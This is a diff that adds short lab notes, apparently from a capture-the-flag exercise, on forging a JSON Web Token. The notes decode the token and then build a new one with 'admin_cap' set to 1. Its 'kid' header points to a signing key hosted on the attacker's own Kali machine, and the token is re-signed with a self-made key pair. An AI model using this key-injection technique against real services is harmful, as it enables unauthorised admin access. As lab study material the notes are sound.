@@ -1,0 +1,41 @@
+go to https://jwt.io
+
+enc : eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6Ly9sb2NhbGhvc3Q6NzA3MC9wcml2S2V5LmtleSJ9.eyJ1c2VybmFtZSI6ImhlbGxvIiwiZW1haWwiOiJoZWxsb0BoZWxsby5jb20iLCJhZG1pbl9jYXAiOjB9.WVXEX3Db8R7gq7rw8ipEGwFcqm5pNj8GlKXBJYAV73DI1NwS3GsWm1FN5QFyyKtuVl4CfPa2BSpQTP0hFpIAMm8CGFdlNyMO-xs5VcVWY7ForYsXi7BEgRv1BOouSmlGnZqpYt18WDXyXLHYq6aJR2osFsQNDT0u9uLcLM8xMSWNACsW2JDExLgdTtbRlTegO5tSu21kHKukmdGcJIsAsArqwf6W3ZLCfwygQj-cMPps-UvirW-427h8OP_J81SCWf8G8_m6XGMLgBR8UM2Vs9MsAWJzFcjlqVATFpMXF59n7g5dE-drYzdEKER5Q0ZyqZlhP-6-M-5GhheqqhdH5Q55BxRRlSGXzNA_QZx-HTUKbFlbDqDOyLzHn5fQyaI_jsCgEAtl9GmXGjKax-ryvNS8h40bslG-q8hcEMsJdb6IagvAUYHAJQf7550DhjQSlSOkgVNSd5t3XpZw0qIwyJ3NEJucJ3XBpaaXCfmAgiU0vHqgBiTHnn1Ci40uuyhd37OlFOXoyNcSW0pZ1E-lyWxxE64NWPz9CgxosGNnDocVbnk07T36ePTgkI_s3LqP1ja3pNOJy5S4M8exLIO8yF9V5haLItJXSrROwxFXVSHyfd61QdqbDwhR01gnzGq2an-G4XqDYQIVrtQcwgZmToIo-yebX53LsqL9x3nx4EQ
+
+
+dec : 
+	header: 
+		{
+  "typ": "JWT",
+  "alg": "RS256",
+  "kid": "http://localhost:7070/privKey.key"
+}
+
+	payload (data):
+		{
+  "username": "hello",
+  "email": "hello@hello.com",
+  "admin_cap": 0
+}
+
+	
+
+generate custom token with admin_cap set to 1 and kid variable to <kali_ip>/privKey.key --> rename generated private key to privKey.key
+dec:
+	header:
+		{
+  "typ": "JWT",
+  "alg": "RS256",
+  "kid": "http://10.10.14.25:7070/privKey.key"
+}
+
+	payload:
+		{
+  "username": "hello",
+  "email": "hello@hello.com",
+  "admin_cap": 1
+}
+
+in verify signature paste generated public and private keys
+
+modified enc jwt token generated!
